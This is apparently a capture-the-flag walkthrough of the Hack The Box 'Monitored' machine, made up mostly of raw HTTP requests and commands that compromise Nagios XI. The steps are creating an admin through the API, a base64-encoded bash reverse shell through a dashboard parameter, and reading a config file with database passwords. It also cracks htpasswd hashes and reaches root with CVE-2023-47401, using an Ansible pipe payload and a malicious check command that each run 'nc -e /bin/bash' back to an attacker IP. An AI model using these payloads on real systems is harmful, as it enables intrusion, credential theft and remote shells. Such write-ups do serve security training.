IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
```


```
POST /nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1 HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=sgpup78cc4d6678th3kt12oqlk
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0. Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 85

username=hacked&password=hello123&name=Fuck+This&email=test@test.com&auth_level=admin
```

```
HTTP/1.1 200 OK
Date: Mon, 15 Jan 2024 16:54:52 GMT
Server: Apache/2.4.56 (Debian)
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT
Content-Length: 94
Connection: close
Content-Type: application/json

{
    "success": "User account exploited_finally was added successfully!",
    "user_id": 6
}
```

upload dashlet:



```
https://nagios.monitored.htb/nagiosxi/admin
```

```
GET https://nagios.monitored.htb/nagiosxi/dashboards/?cmd=echo+'c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMjgvMTIzNCAwPiYxICAK'+|+base64+-d+|+bash
Host: nagios.monitored.htb
Cookie: nagiosxi=9tfv30nn8aliu5pfcnhcjur2qu
```

`cat /home/nagios/user.txt`

`cat /usr/local/nagiosxi/html/config.inc.php`


```

$cfg['htaccess_file'] = "/usr/local/nagiosxi/etc/htpasswd.users";
$cfg['htpasswd_path'] = "/usr/bin/htpasswd";

// DB-specific connection information                                                                                                                                                                               
$cfg['db_info'] = array(
    "nagiosxi" => array(
        "dbtype" => 'mysql',
        "dbserver" => '',
        "user" => 'nagiosxi',
        "pwd" => 'n@gweb',
        "db" => 'nagiosxi',
        "charset" => "utf8",
        "dbmaint" => array( // variables affecting maintenance of db
            "max_auditlog_age" => 180, // max time (in DAYS) to keep audit log entries
            "max_commands_age" => 480, // max time (minutes) to keep commands
            "max_events_age" => 480, // max time (minutes) to keep events
            "optimize_interval" => 60, // time (in minutes) between db optimization runs
            "repair_interval" => 0, // time (in minutes) between db repair runs
        ),
    ),
    "ndoutils" => array(
        "dbtype" => 'mysql',
        "dbserver" => 'localhost',
        "user" => 'ndoutils',
        "pwd" => 'n@gweb',
        "db" => 'nagios',
        "charset" => "utf8",
        "dbmaint" => array( // variables affecting maintenance of ndoutils db
            "max_externalcommands_age" => 7, // max time (in DAYS) to keep external commands
            "max_logentries_age" => 90, // max time (in DAYS) to keep log entries
            "max_statehistory_age" => 730, // max time (in DAYS) to keep state history information
            "max_notifications_age" => 90, // max time (in DAYS) to keep notifications
            "max_timedevents_age" => 5, // max time (minutes) to keep timed events
            "max_systemcommands_age" => 5, // max time (minutes) to keep system commands
            "max_servicechecks_age" => 5, // max time (minutes) to keep service checks
            "max_hostchecks_age" => 5, // max time (minutes) to keep host checks
            "max_eventhandlers_age" => 5, // max time (minutes) to keep event handlers
            "optimize_interval" => 60, // time (in minutes) between db optimization runs
            "repair_interval" => 0, // time (in minutes) between db repair runs
        ),
    ),
    "nagiosql" => array(
        "dbtype" => 'mysql',
        "dbserver" => 'localhost',
        "user" => 'nagiosql',
        "pwd" => 'n@gweb',
        "db" => 'nagiosql',
        "charset" => "utf8",
        "dbmaint" => array( // variables affecting maintenance of db
            "max_logbook_age" => 480, // max time (minutes) to keep log book records
            "optimize_interval" => 60, // time (in minutes) between db optimization runs
            "repair_interval" => 0, // time (in minutes) between db repair runs
        ),
    ),
);
```

content of `/usr/bin/htpasswd`

cracked using jhon with rockyou was able to find only my own password

`john hash.txt --format=Raw-SHA1-AxCrypt --wordlist=~/rockyou.txt`
```
cat /usr/local/nagiosxi/etc/htpasswd.users
nagiosadmin:{SHA}WafcJ8xiUKCvKhkZpBW1+oJm59Q=
nagiosxi:{SHA}tu+2LQemR+XONdxwgApW0NB7qlM=
svc:{SHA}PgRMQuGZauDk1dCs5W0lY/d2mHI=
exploited_finally:{SHA}QjMTfRxRDy5VulyyILhksRAz8VY=
hacked:{SHA}QjMTfRxRDy5VulyyILhksRAz8VY=
```

# ROOT

Used an unintented CVE to get root.

https://research.nccgroup.com/2023/12/13/technical-advisory-multiple-vulnerabilities-in-nagios-xi/#wp-block-heading

`CVE-2023-47401`


```
POST /nagiosxi/admin/migrate.php HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=9tfv30nn8aliu5pfcnhcjur2qu
Content-Length: 322
Cache-Control: max-age=0
Authorization: Basic c3ZjOlhqSDdWQ2Vob3dwUjF4WkI=
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://nagios.monitored.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://nagios.monitored.htb/nagiosxi/admin/migrate.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

cmd=migrate&address=aaaaaaaaaaa&username=%52%65%73%65%61%72%63%68%0a%20%20%6e%61%6d%65%3a%20%22%7b%7b%20%6c%6f%6f%6b%75%70%28%5c%22%70%69%70%65%5c%22%2c%20%5c%22%6e%63%20%31%30%2e%31%30%2e%31%36%2e%32%38%20%31%32%33%34%35%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68%20%5c%22%29%20%7d%7d%22&password=test&overwrite=1&nagios_cfg=
```

payload:

```
Research
  name: "{{ lookup(\"pipe\", \"nc 10.10.16.28 12345 -e /bin/bash \") }}"
```

### Intented ROOT way

`Configure` -> `Core config manager` -> `Commands`

Add command:

`/usr/bin/nc 10.10.16.28 1234 -e /bin/bash`

- Name: test
- Acive = true
- Command Type = Check Command
- Save
- Apply Configuration

Go again to `Configure` -> `Core config manager`

Click on one of the command defined by default in the main page, inside table `Recently Changed Hosts and Services`

For example click `Ping` command
On check command select `test` and run the command

Once got the shell a `whoami` will return `naigos`.

Add a a public key to `.ssh/athorized_keys` to beeing able to connect via ssh.

`find / -iname '*npcd.cfg' -print 2> /dev/null`